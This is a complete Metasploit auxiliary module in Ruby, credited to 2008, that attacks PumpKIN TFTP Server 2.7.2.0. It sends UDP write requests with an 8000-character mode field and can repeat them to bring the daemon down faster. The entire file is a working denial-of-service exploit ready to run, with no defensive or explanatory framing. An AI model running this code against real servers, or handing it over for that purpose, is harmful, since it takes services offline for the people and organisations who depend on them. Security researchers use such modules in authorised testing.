require 'msf/core'

class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::Remote::Udp
	

	def initialize(info = {})
		super(update_info(info,	
			'Name'           => 'PumpKIN TFTP Server DoS',
			'Description'    => %q{
				PumpKIN TFTP Server 2.7.2.0 eventually reaches a DoS condition when
				provided with an overly long mode value.  It'll take a minute. 
				This condition is reached quicker when hammered repeatedly.
			},
			'Author'         => ['Saint Patrick','monStream00'],
			'License'        => MSF_LICENSE,
			'Version'        => '7',
			'DisclosureDate' => 'Oct 25 2008'))

		register_options([
			OptInt.new('MULTIPLE', [ false, 'How many times to send (more kills it faster)', 1 ])
		])
	end

	def run
		
		print_status("Sending bad data...")
		
		crapfile=Rex::Text.rand_text_english(4,"\x00")
		crapdata=Rex::Text.rand_text_english(8000,"\x00")
		lamestring="\x00\x02"+crapfile+"\x00"+crapdata+"\x00"
		mul=datastore['MULTIPLE']
		0.upto(mul) do
			connect_udp
			udp_sock.put(lamestring)
			sleep 1
			disconnect_udp
		end

		print_status("PumpKIN TFTP daemon is choking...")

	end
end